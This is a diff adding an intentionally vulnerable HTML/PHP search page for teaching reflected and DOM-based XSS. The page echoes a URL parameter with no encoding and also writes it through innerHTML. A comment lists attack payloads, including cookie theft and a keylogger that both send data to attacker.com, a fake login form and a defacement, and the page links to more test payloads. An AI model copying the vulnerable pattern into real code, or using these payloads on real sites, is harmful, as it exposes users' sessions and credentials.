@@ -1,0 +1,66 @@
+<!--
+  XSS Vulnerable Example
+  
+  WARNING: This code is INTENTIONALLY VULNERABLE.
+  Do NOT use in production. For educational purposes only.
+  
+  Vulnerabilities:
+  1. Reflected XSS via URL parameters
+  2. No output encoding
+  3. No Content Security Policy
+  4. Direct innerHTML usage
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Vulnerable Page</title>
+</head>
+<body>
+    <h1>Search Results</h1>
+    
+    <!-- REFLECTED XSS: User input directly in HTML -->
+    <div id="results">
+        <!-- VULNERABLE: PHP echo without encoding -->
+        <?php echo "Search results for: " . $_GET['q']; ?>
+    </div>
+    
+    <!-- VULNERABLE: JavaScript with user input -->
+    <script>
+        // VULNERABLE: Direct DOM manipulation
+        var searchQuery = new URLSearchParams(window.location.search).get('q');
+        
+        // DANGEROUS: innerHTML parses HTML/JS
+        document.getElementById('results').innerHTML = 'You searched for: ' + searchQuery;
+        
+        // DANGEROUS: eval executes arbitrary code
+        // eval(searchQuery); // Don't do this!
+    </script>
+    
+    <!-- XSS Attack Examples:
+    
+    1. Basic Alert:
+       ?q=<script>alert('XSS')</script>
+    
+    2. Cookie Stealing:
+       ?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+    
+    3. Keylogger:
+       ?q=<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>
+    
+    4. Phishing:
+       ?q=<script>document.body.innerHTML='<h1>Login Required</h1><form>Username:<input name="user"><br>Password:<input type="password" name="pass"><button>Login</button></form>'</script>
+    
+    5. Defacement:
+       ?q=<script>document.body.style.background='black';document.body.innerHTML='<h1 style="color:red">HACKED</h1>'</script>
+    
+    -->
+    
+    <h2>Try These Attacks</h2>
+    <ul>
+        <li><a href="?q=<script>alert('XSS')</script>">Basic XSS Alert</a></li>
+        <li><a href="?q=<script>document.write('<img src=x onerror=alert(1)>')">Image Error XSS</a></li>
+        <li><a href="?q=<svg onload=alert('SVG XSS')>">SVG XSS</a></li>
+    </ul>
+</body>
+</html>
